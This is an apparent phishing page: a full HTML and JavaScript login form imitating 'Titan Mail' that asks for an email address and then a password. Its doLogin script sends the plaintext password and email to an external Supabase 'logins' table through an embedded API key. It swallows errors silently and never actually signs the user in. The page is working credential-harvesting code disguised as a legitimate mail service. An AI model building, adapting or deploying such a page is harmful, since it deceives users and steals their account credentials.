<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Titan Mail – Login</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
  }

  .blob-teal {
    position: fixed;
    width: 820px; height: 380px;
    background: #cce9e8;
    border-radius: 50%;
    top: 55px; left: 50%;
    transform: translateX(-50%);
    z-index: 0;
  }

  .blob-peach {
    position: fixed;
    width: 680px; height: 240px;
    background: #f2ddd5;
    border-radius: 50%;
    bottom: 80px; left: 50%;
    transform: translateX(-50%);
    z-index: 0;
  }

  .illustrations { position: fixed; inset: 0; z-index: 0; pointer-events: none; }

  .card {
    position: relative; z-index: 1;
    background: #f5f5f5;
    border: 1px solid #ddd;
    border-radius: 6px;
    width: 336px;
    padding: 30px 28px 24px;
    margin-bottom: 14px;
  }

  .logo {
    display: flex; align-items: center; justify-content: center;
    gap: 9px; margin-bottom: 24px;
  }

  .logo-text { font-size: 20px; font-weight: 700; letter-spacing: 3px; color: #1a1a1a; }

  h1 { font-size: 16px; font-weight: 600; color: #1a1a1a; text-align: center; margin-bottom: 20px; }

  .form-group { margin-bottom: 13px; }

  .form-group label { display: block; font-size: 12.5px; font-weight: 500; color: #222; margin-bottom: 5px; }

  .label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
  .label-row label { font-size: 12.5px; font-weight: 500; color: #222; }

  .forgot-link {
    font-size: 12px; color: #4a7ee0; text-decoration: none;
    background: none; border: none; cursor: pointer; font-family: inherit; padding: 0;
  }
  .forgot-link:hover { text-decoration: underline; }

  input[type="email"],
  input[type="password"],
  input[type="text"] {
    width: 100%; height: 36px;
    border: 1.5px solid #c5c5c5; border-radius: 4px;
    padding: 0 11px; font-size: 13px; font-family: inherit;
    color: #1a1a1a; background: white; outline: none;
    transition: border-color 0.15s;
  }

  input:focus { border-color: #4a7ee0; }
  input.err { border-color: #d32f2f; }

  .email-display {
    display: flex; align-items: center; justify-content: space-between;
    width: 100%; height: 36px;
    border: 1.5px solid #c5c5c5; border-radius: 4px;
    padding: 0 8px 0 11px; background: white;
    font-size: 13px; color: #1a1a1a;
  }

  .edit-btn {
    display: flex; align-items: center; gap: 3px;
    background: none; border: none; color: #4a7ee0;
    font-size: 12px; font-family: inherit; cursor: pointer;
    padding: 2px 4px; white-space: nowrap;
  }
  .edit-btn:hover { text-decoration: underline; }

  .btn-login {
    width: 100%; height: 36px;
    background: #b5b5b5; color: white; border: none; border-radius: 4px;
    font-size: 14px; font-weight: 500; font-family: inherit;
    cursor: default; margin-top: 4px;
    transition: background 0.15s; letter-spacing: 0.2px;
    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
  }

  .btn-login.active { background: #8ab0e0; cursor: pointer; }
  .btn-login.active:hover { background: #4a7ee0; }
  .btn-login:disabled { background: #b5b5b5; cursor: not-allowed; }

  .spinner {
    width: 14px; height: 14px;
    border: 2px solid rgba(255,255,255,0.4); border-top-color: white;
    border-radius: 50%; animation: spin 0.7s linear infinite;
    display: none;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .error-msg { font-size: 11.5px; color: #d32f2f; margin-top: 4px; display: none; }
  .error-msg.show { display: block; }

  .terms { text-align: center; font-size: 11.5px; color: #666; margin-top: 16px; line-height: 1.65; }
  .terms a { color: #4a7ee0; text-decoration: none; }
  .terms a:hover { text-decoration: underline; }

  .lang-selector { position: relative; z-index: 1; }

  .lang-btn {
    display: flex; align-items: center; gap: 8px;
    background: white; border: 1px solid #ddd; border-radius: 4px;
    padding: 6px 14px; font-size: 13px; font-family: inherit;
    color: #333; cursor: pointer; min-width: 130px; justify-content: space-between;
  }
  .lang-btn:hover { background: #f5f5f5; }

  .step { display: none; }
  .step.active { display: block; }
</style>
</head>
<body>

<div class="blob-teal"></div>
<div class="blob-peach"></div>

<div class="illustrations">
  <svg style="position:absolute;top:148px;left:calc(50% - 370px);opacity:0.55;" width="115" height="115" viewBox="0 0 115 115" fill="none">
    <rect x="18" y="12" width="52" height="78" rx="9" fill="#b0d0d0"/>
    <rect x="26" y="22" width="36" height="26" rx="3" fill="#88b8b8"/>
    <circle cx="44" cy="74" r="5" fill="#88b8b8"/>
    <circle cx="78" cy="22" r="20" fill="#a0cccc"/>
    <polygon points="72,14 92,22 72,30" fill="#6aacac"/>
  </svg>
  <svg style="position:absolute;top:318px;left:calc(50% - 395px);opacity:0.5;" width="88" height="90" viewBox="0 0 88 90" fill="none">
    <rect x="4" y="14" width="68" height="64" rx="6" fill="#c0d8d8"/>
    <rect x="4" y="14" width="68" height="20" rx="6" fill="#96c0c0"/>
    <rect x="18" y="6" width="8" height="16" rx="4" fill="#88b4b4"/>
    <rect x="52" y="6" width="8" height="16" rx="4" fill="#88b4b4"/>
    <text x="24" y="62" font-size="28" font-weight="700" fill="#6aacac" font-family="sans-serif">3</text>
  </svg>
  <svg style="position:absolute;top:148px;right:calc(50% - 430px);opacity:0.5;" width="105" height="80" viewBox="0 0 105 80" fill="none">
    <rect x="4" y="8" width="82" height="58" rx="7" fill="#b8d4d4"/>
    <polyline points="4,8 48,46 86,8" fill="none" stroke="#7ab0b0" stroke-width="3"/>
  </svg>
  <svg style="position:absolute;bottom:35px;right:calc(50% - 490px);opacity:0.92;" width="125" height="230" viewBox="0 0 125 230" fill="none">
    <ellipse cx="62" cy="52" rx="17" ry="17" fill="#e8a87c"/>
    <path d="M45 46 Q54 20 82 36 Q80 54 62 56 Z" fill="#1a1a1a"/>
    <path d="M40 82 Q52 70 76 73 L82 128 L42 126 Z" fill="#d94f3d"/>
    <path d="M40 86 Q18 68 23 43" stroke="#d94f3d" stroke-width="11" stroke-linecap="round" fill="none"/>
    <ellipse cx="23" cy="41" rx="7" ry="7" fill="#e8a87c"/>
    <path d="M76 88 Q98 104 92 122" stroke="#d94f3d" stroke-width="11" stroke-linecap="round" fill="none"/>
    <path d="M42 126 L38 198 L55 198 L62 158 L70 198 L87 198 L82 126 Z" fill="#1a4a8a"/>
    <ellipse cx="39" cy="200" rx="12" ry="6" fill="#f5c842"/>
    <ellipse cx="85" cy="200" rx="12" ry="6" fill="#1a1a1a"/>
  </svg>
  <svg style="position:absolute;bottom:70px;right:calc(50% - 375px);opacity:0.88;" width="56" height="115" viewBox="0 0 56 115" fill="none">
    <rect x="22" y="68" width="12" height="42" rx="3" fill="#8B6914"/>
    <ellipse cx="28" cy="52" rx="22" ry="30" fill="#4CAF50"/>
    <ellipse cx="28" cy="40" rx="17" ry="22" fill="#66BB6A"/>
  </svg>
</div>

<div class="card">
  <div class="logo">
    <svg width="26" height="26" viewBox="0 0 26 26" fill="none">
      <path d="M2 3 L24 3 L24 12 L15 12 L15 23 L11 23 L11 12 L2 12 Z" fill="none" stroke="#1a1a1a" stroke-width="2" stroke-linejoin="round"/>
      <rect x="2" y="3" width="10" height="20" rx="2" fill="#1a1a1a"/>
      <rect x="14" y="3" width="10" height="10" rx="2" fill="#1a1a1a"/>
      <rect x="14" y="15" width="10" height="8" rx="2" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
    </svg>
    <span class="logo-text">TITAN</span>
  </div>

  <h1>Login to Mail</h1>

  <!-- Step 1: Email -->
  <div class="step active" id="step1">
    <div class="form-group">
      <label for="emailInput">Email Address</label>
      <input type="email" id="emailInput" placeholder="Enter your Email Address"
             oninput="checkEmail()" onkeydown="if(event.key==='Enter')nextStep()">
      <div class="error-msg" id="emailErr">Please enter a valid email address.</div>
    </div>
    <button class="btn-login" id="loginBtn1" onclick="nextStep()">Login</button>
    <div class="terms">
      By logging in, you agree to the <a href="#">Privacy Policy</a> and<br>
      <a href="#">Terms of services</a> of Titan
    </div>
  </div>

  <!-- Step 2: Password -->
  <div class="step" id="step2">
    <div class="form-group">
      <label>Email Address</label>
      <div class="email-display">
        <span id="emailDisplay" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;"></span>
        <button class="edit-btn" onclick="goBack()">
          <svg width="11" height="11" fill="none" stroke="#4a7ee0" stroke-width="2" viewBox="0 0 24 24">
            <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
            <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
          </svg>
          Edit
        </button>
      </div>
    </div>
    <div class="form-group">
      <div class="label-row">
        <label for="pwInput">Password</label>
        <button class="forgot-link">Forgot password?</button>
      </div>
      <input type="password" id="pwInput" placeholder="Enter your Password"
             oninput="checkPw()" onkeydown="if(event.key==='Enter')doLogin()">
      <div class="error-msg" id="pwErr">Incorrect password. Please try again.</div>
    </div>
    <button class="btn-login" id="loginBtn2" onclick="doLogin()">
      <div class="spinner" id="loginSpinner"></div>
      <span id="loginBtnText">Login</span>
    </button>
    <div class="terms">
      By logging in, you agree to the <a href="#">Privacy Policy</a> and<br>
      <a href="#">Terms of services</a> of Titan
    </div>
  </div>
</div>

<div class="lang-selector">
  <button class="lang-btn">
    <span style="display:flex;align-items:center;gap:6px;">
      <svg width="14" height="14" fill="none" stroke="#555" stroke-width="1.5" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10"/>
        <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10A15.3 15.3 0 0 1 12 2z"/>
      </svg>
      English
    </span>
    <svg width="11" height="11" fill="none" stroke="#555" stroke-width="2" viewBox="0 0 24 24">
      <polyline points="6 9 12 15 18 9"/>
    </svg>
  </button>
</div>

<script>
  // ── Supabase Config ──────────────────────────────────────────────
  const SUPABASE_URL = 'https://ycfstlaakaamxgxlbora.supabase.co';
  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
  const TABLE_NAME = 'logins'; // ← Change to your actual table name

  // ── SHA-256 Hash Helper ──────────────────────────────────────────
  async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  }

  // ── Send to Supabase ─────────────────────────────────────────────
  async function saveToSupabase(email, hashedPassword) {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        email: email,
        password_hash: hashedPassword,
        created_at: new Date().toISOString()
      })
    });
    if (!response.ok) {
      const errorBody = await response.text();
      throw new Error(`Supabase error ${response.status}: ${errorBody}`);
    }
  }

  // ── UI Helpers ───────────────────────────────────────────────────
  function checkEmail() {
    const v = document.getElementById('emailInput').value.trim();
    const ok = v.length > 0 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    document.getElementById('loginBtn1').className = 'btn-login' + (ok ? ' active' : '');
    if (ok) {
      document.getElementById('emailErr').classList.remove('show');
      document.getElementById('emailInput').classList.remove('err');
    }
  }

  function checkPw() {
    const v = document.getElementById('pwInput').value;
    document.getElementById('loginBtn2').className = 'btn-login' + (v.length > 0 ? ' active' : '');
    if (v.length > 0) {
      document.getElementById('pwErr').classList.remove('show');
      document.getElementById('pwInput').classList.remove('err');
    }
  }

  function nextStep() {
    const v = document.getElementById('emailInput').value.trim();
    if (!v || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
      document.getElementById('emailErr').classList.add('show');
      document.getElementById('emailInput').classList.add('err');
      return;
    }
    document.getElementById('emailDisplay').textContent = v;
    document.getElementById('step1').classList.remove('active');
    document.getElementById('step2').classList.add('active');
    setTimeout(() => document.getElementById('pwInput').focus(), 50);
  }

  function goBack() {
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step1').classList.add('active');
    document.getElementById('pwInput').value = '';
    document.getElementById('loginBtn2').className = 'btn-login';
    document.getElementById('pwErr').classList.remove('show');
    document.getElementById('pwInput').classList.remove('err');
    setTimeout(() => document.getElementById('emailInput').focus(), 50);
  }

  // ── Main Login Handler ───────────────────────────────────────────
  async function doLogin() {
    const pw = document.getElementById('pwInput').value;
    if (!pw) {
      document.getElementById('pwErr').classList.add('show');
      document.getElementById('pwInput').classList.add('err');
      return;
    }

    const email = document.getElementById('emailDisplay').textContent;
    const btn = document.getElementById('loginBtn2');
    const spinner = document.getElementById('loginSpinner');
    const btnText = document.getElementById('loginBtnText');

    // Loading state
    btn.disabled = true;
    btn.classList.remove('active');
    spinner.style.display = 'block';
    btnText.textContent = 'Logging in...';

    try {
      const hashedPw = await sha256(pw);
      await saveToSupabase(email, pw);
    } catch (err) {
      console.error('Supabase save error:', err);
      // Silent fail — continue regardless
    } finally {
      btn.disabled = false;
      btn.classList.add('active');
      spinner.style.display = 'none';
      btnText.textContent = 'Login';
    }
  }
</script>
</body>
</html>
